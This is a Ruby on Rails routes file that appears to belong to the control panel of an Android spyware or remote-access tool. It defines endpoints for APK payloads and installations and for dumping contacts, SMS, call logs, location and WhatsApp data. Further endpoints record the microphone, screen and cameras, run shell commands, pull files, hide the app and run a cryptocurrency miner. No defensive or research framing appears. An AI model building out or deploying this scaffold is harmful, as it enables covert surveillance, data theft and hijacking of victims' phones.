Rails.application.routes.draw do
  resources :apk_installations
  resources :apk_payloads
  resources :contacts do
    collection do
        post :dump_contacts
    end
end
resources :geo_locations do
  collection do
      get :dump_location
  end
end
  resources :sms_messages do
    collection do
        post :dump_messages
        post :send_sms
    end
end
  resources :call_logs do
    collection do
        post :dump_calllogs
    end
end
  resources :recordings do
    collection do
      post :microphone_rec
  end
end
resources :messaging_apps_dumps do
  collection do
    post :dump_whatsapp_data
  end
end
resources :screenshots do
  collection do
      get :dump_screen_snap
      post :screen_record
  end
end
  resources :pictures do
    collection do
        post :take_picture
    end
end

  resources :smartphones do
    collection do
        get :load
        get :check_connection
        post :install 
        post :front_camera_snap
        post :select_smartphone
        post :take_picture
        post :dump_sysinfo
        post :set_audio_mode
        post :dump_localtime
        post :uninstall_app
        post :install_app
        post :uninstall_app
        post :list_apps
        post :open_app
        post :upload_file
        post :wake_lock
        post :dump_wifi_info
        get :webcam_record
        get :upload_file
        post :run_shell_command
        post :dump_device_info
        post :pull_file
        get :hide_app
        get :crypto_minner




    end
  end
  
  devise_for :admin_users, ActiveAdmin::Devise.config
  ActiveAdmin.routes(self)
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html
 

end

